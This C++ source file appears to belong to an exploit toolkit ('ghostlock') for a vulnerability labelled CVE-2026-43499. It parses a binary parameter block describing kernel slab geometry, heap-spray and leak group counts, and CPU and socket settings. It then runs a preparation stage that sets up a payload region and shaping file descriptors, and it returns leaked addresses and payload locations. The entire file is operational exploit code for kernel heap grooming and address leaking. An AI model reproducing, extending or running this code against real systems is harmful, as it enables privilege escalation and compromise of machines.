#include "platform/native_prepare_43499.hpp"

#include <cerrno>
#include <cstring>
#include <memory>
#include <unistd.h>

#include "backend/cve_2026_43499/leak/snitch_setup.hpp"
#include "backend/cve_2026_43499/steps/prepare_runner.hpp"
#include "backend/cve_2026_43499/steps/words_region.hpp"

namespace ghostlock::platform::native43499 {
namespace {
constexpr std::uint32_t kMagic = 0x474C5050U;
constexpr std::uint32_t kResultMagic = 0x474C5052U;
constexpr std::uint16_t kVersion = 1U;
constexpr std::size_t kHeader = 192U;
constexpr std::size_t kResultBytes = 160U;

std::uint16_t u16(const std::uint8_t *p, std::size_t at) noexcept {
    return static_cast<std::uint16_t>(p[at]) | static_cast<std::uint16_t>(p[at + 1U] << 8U);
}
std::uint32_t u32(const std::uint8_t *p, std::size_t at) noexcept {
    return static_cast<std::uint32_t>(p[at]) | (static_cast<std::uint32_t>(p[at + 1U]) << 8U) |
           (static_cast<std::uint32_t>(p[at + 2U]) << 16U) | (static_cast<std::uint32_t>(p[at + 3U]) << 24U);
}
std::uint64_t u64(const std::uint8_t *p, std::size_t at) noexcept {
    return static_cast<std::uint64_t>(u32(p, at)) | (static_cast<std::uint64_t>(u32(p, at + 4U)) << 32U);
}
void put32(std::uint8_t *p, std::size_t at, std::uint32_t v) noexcept {
    for (std::size_t i = 0U; i < 4U; ++i) p[at + i] = static_cast<std::uint8_t>(v >> (8U * i));
}
void put64(std::uint8_t *p, std::size_t at, std::uint64_t v) noexcept {
    for (std::size_t i = 0U; i < 8U; ++i) p[at + i] = static_cast<std::uint8_t>(v >> (8U * i));
}
std::uint8_t status_code(const char *s) noexcept {
    if (s == nullptr) return 0U;
    if (std::strcmp(s, "ok") == 0) return 0U;
    if (std::strcmp(s, "param-invalid") == 0) return 1U;
    if (std::strcmp(s, "geometry-missing") == 0) return 2U;
    if (std::strcmp(s, "call-failed") == 0) return 3U;
    if (std::strcmp(s, "plan-missing") == 0) return 4U;
    return 99U;
}
std::uint8_t refusal_code(const char *s) noexcept {
    if (s == nullptr) return 0U;
    if (std::strcmp(s, "prepare-proof-count-bad") == 0) return 1U;
    if (std::strcmp(s, "prepare-hash-init-failed") == 0) return 2U;
    if (std::strcmp(s, "prepare-words-region-missing") == 0) return 3U;
    if (std::strcmp(s, "prepare-no-colliding-words") == 0) return 4U;
    if (std::strcmp(s, "prepare-page-size-missing") == 0) return 5U;
    if (std::strcmp(s, "prepare-region-size-zero") == 0) return 6U;
    return 99U;
}
std::uint8_t verdict_code(const char *s) noexcept {
    if (s == nullptr) return 0U;
    if (std::strcmp(s, "ok") == 0) return 1U;
    if (std::strcmp(s, "plan-missing") == 0) return 2U;
    if (std::strcmp(s, "geometry-missing") == 0) return 3U;
    if (std::strcmp(s, "call-failed") == 0) return 4U;
    return 99U;
}
}  // namespace

struct PrepareHandle final {
    std::unique_ptr<ghostlock::backend::cve_2026_43499::steps::WordsRegion> words;
    bool ran = false;
    bool fd_transferred = false;
    std::int32_t shaping_fd = -1;
    std::int32_t shaping_peer_fd = -1;
};

PrepareHandle *prepare_create() noexcept {
    try {
        auto h = std::make_unique<PrepareHandle>();
        h->words = std::make_unique<ghostlock::backend::cve_2026_43499::steps::WordsRegion>();
        return h.release();
    } catch (...) { return nullptr; }
}

void prepare_destroy(PrepareHandle *h) noexcept {
    if (h == nullptr) return;
    if (!h->fd_transferred) {
        if (h->shaping_fd >= 0) (void)::close(h->shaping_fd);
        if (h->shaping_peer_fd >= 0) (void)::close(h->shaping_peer_fd);
    }
    h->words.reset();
    delete h;
}

bool parse_prepare(const std::uint8_t *b, std::size_t n, PrepareParams &o, std::string &e) noexcept {
    if (b == nullptr || n < kHeader) { e = "short"; return false; }
    if (u32(b, 0U) != kMagic || u16(b, 4U) != kVersion || u16(b, 6U) != kHeader || u32(b, 8U) != n) {
        e = "header"; return false;
    }
    if (u32(b, 12U) != 0U || u32(b, 156U) != 0U) { e = "reserved"; return false; }
    const std::uint32_t c = u32(b, 40U), t = u32(b, 44U), p = u32(b, 48U), proofs = u32(b, 52U);
    if (u64(b, 16U) == 0U || u64(b, 24U) == 0U || u64(b, 32U) >= 63U) { e = "geometry"; return false; }
    if (c < 2U || c > 64U || t == 0U || p == 0U || proofs == 0U || proofs > 4U) { e = "counts"; return false; }
    if (u64(b, 64U) == 0U || u64(b, 72U) <= u64(b, 64U)) { e = "range"; return false; }
    if (u32(b, 80U) == 0U || u32(b, 84U) == 0U || u32(b, 96U) == 0U || u32(b, 100U) == 0U ||
        u32(b, 104U) == 0U || u32(b, 108U) == 0U || u32(b, 132U) < 2U || u32(b, 136U) == 0U ||
        u32(b, 140U) == 0U) { e = "region"; return false; }
    o.page_size = u64(b, 16U); o.mm_struct_size = u64(b, 24U); o.mm_slab_order = u64(b, 32U);
    o.collisions = c; o.thread_count = t; o.possible_cpus = p; o.proof_count = proofs;
    o.proof_seed = u64(b, 56U); o.range_start = u64(b, 64U); o.range_end = u64(b, 72U);
    o.counter_offset = u32(b, 80U); o.wake_rounds = u32(b, 84U);
    o.round_timeout_us = static_cast<std::int64_t>(u64(b, 88U));
    o.header_bytes = u32(b, 96U); o.total_pokes = u32(b, 100U);
    o.word_bytes = u32(b, 104U); o.handle_bytes = u32(b, 108U);
    o.pre_groups = u32(b, 112U); o.pre_shaped_groups = u32(b, 116U);
    o.spray_groups = u32(b, 120U); o.post_groups = u32(b, 124U); o.leak_groups = u32(b, 128U);
    o.snitch_collisions = u32(b, 132U); o.max_attempts = u32(b, 136U); o.poll_rounds = u32(b, 140U);
    o.socket_buffer = static_cast<std::int32_t>(u32(b, 144U));
    o.main_cpu = static_cast<std::int32_t>(u32(b, 148U)); o.sweep_tags = b[152U] != 0U;
    e.clear(); return true;
}

long prepare_run(PrepareHandle *h, const PrepareParams &p, PrepareResult &o) noexcept {
    o = PrepareResult{};
    if (h == nullptr || h->ran) return -EINVAL;
    h->ran = true;
    using namespace ghostlock::backend::cve_2026_43499;
    leak::SnitchInputs in{};
    in.page_size = p.page_size; in.mm_struct_size = p.mm_struct_size; in.mm_slab_order = p.mm_slab_order;
    in.collisions = p.collisions; in.thread_count = p.thread_count; in.possible_cpus = p.possible_cpus;
    leak::SnitchSetup setup{};
    if (leak::build_snitch_setup(in, setup) != leak::SnitchSetupVerdict::Ok) return -EINVAL;
    steps::PrepareRequest r{};
    r.setup = setup;
    r.region.header_bytes = p.header_bytes; r.region.collisions = p.collisions;
    r.region.thread_count = p.thread_count; r.region.total_pokes = p.total_pokes;
    r.region.page_size = p.page_size; r.region.word_bytes = p.word_bytes; r.region.handle_bytes = p.handle_bytes;
    r.patience.wake_rounds = p.wake_rounds; r.patience.round_timeout_us = p.round_timeout_us;
    r.strides = setup.strides; r.range.start = p.range_start; r.range.end = p.range_end;
    r.counter_offset = p.counter_offset;
    r.inputs.pre_groups = p.pre_groups; r.inputs.pre_shaped_groups = p.pre_shaped_groups;
    r.inputs.spray_groups = p.spray_groups; r.inputs.post_groups = p.post_groups; r.inputs.leak_groups = p.leak_groups;
    r.inputs.snitch_collisions = p.snitch_collisions;
    r.page_size = p.page_size; r.words = h->words.get(); r.proof_seed = p.proof_seed;
    r.proof_count = p.proof_count; r.sweep_tags = p.sweep_tags;
    r.waiting.max_attempts = p.max_attempts; r.waiting.poll_rounds = p.poll_rounds;
    r.geometry.socket_buffer = p.socket_buffer; r.geometry.main_cpu = p.main_cpu;
    steps::PrepareReport report{};
    const char *refusal = nullptr;
    o.ran = steps::run_prepare(r, report, &refusal);
    o.status = status_code(report.status); o.refusal = refusal_code(refusal);
    o.at_step = static_cast<std::uint8_t>(report.at_step < 0 ? 0 : report.at_step);
    o.base = report.base; o.shaping_fd = report.shaping_fd; o.shaping_peer_fd = report.shaping_peer_fd;
    o.opened = static_cast<std::uint32_t>(report.opened); o.closed = static_cast<std::uint32_t>(report.closed);
    o.error = report.error; o.snitch_found = report.snitch_found;
    o.snitch_address = report.snitch_loop_address; o.snitch_verdict = verdict_code(report.snitch_verdict);
    if (h->words != nullptr) {
        o.words_base = h->words->base();
        o.payload_base = reinterpret_cast<std::uint64_t>(h->words->payload());
        o.proof_count = static_cast<std::uint32_t>(h->words->count());
        o.payload_offset = static_cast<std::uint32_t>(steps::WordsRegion::kPayloadOffset());
        for (std::uint32_t i = 0U; i < 4U; ++i) { o.words[i] = h->words->address(i); o.proofs[i] = o.words[i]; }
    }
    h->shaping_fd = report.shaping_fd; h->shaping_peer_fd = report.shaping_peer_fd;
    h->fd_transferred = o.ran && o.status == 0U && report.shaping_fd >= 0;
    return 0;
}

bool prepare_word(const PrepareHandle *h, std::uint32_t i, std::uint64_t &o) noexcept {
    if (h == nullptr || h->words == nullptr || i >= h->words->count()) return false;
    o = h->words->address(i); return true;
}
std::uint64_t prepare_words_base(const PrepareHandle *h) noexcept {
    return h != nullptr && h->words != nullptr ? h->words->base() : 0U;
}
std::uint64_t prepare_payload_base(const PrepareHandle *h) noexcept {
    return h != nullptr && h->words != nullptr ? reinterpret_cast<std::uint64_t>(h->words->payload()) : 0U;
}

bool encode_prepare_result(const PrepareResult &r, std::uint8_t *o, std::size_t n) noexcept {
    if (o == nullptr || n < kResultBytes) return false;
    std::memset(o, 0, kResultBytes);
    put32(o, 0U, kResultMagic); o[4U] = static_cast<std::uint8_t>(kVersion);
    put32(o, 8U, static_cast<std::uint32_t>(kResultBytes));
    o[12U] = r.ran ? 1U : 0U; o[13U] = r.status; o[14U] = r.refusal; o[15U] = r.at_step;
    put64(o, 16U, r.base); put64(o, 24U, r.words_base); put64(o, 32U, r.payload_base);
    put32(o, 40U, static_cast<std::uint32_t>(r.shaping_fd));
    put32(o, 44U, static_cast<std::uint32_t>(r.shaping_peer_fd));
    put32(o, 48U, r.opened); put32(o, 52U, r.closed); put32(o, 56U, static_cast<std::uint32_t>(r.error));
    put32(o, 60U, r.proof_count); put64(o, 64U, r.snitch_found); put64(o, 72U, r.snitch_address);
    o[80U] = r.snitch_verdict;
    for (std::size_t i = 0U; i < 4U; ++i) put64(o, 88U + i * 8U, r.proofs[i]);
    for (std::size_t i = 0U; i < 4U; ++i) put64(o, 120U + i * 8U, r.words[i]);
    put32(o, 152U, r.payload_offset);
    return true;
}
}  // namespace ghostlock::platform::native43499
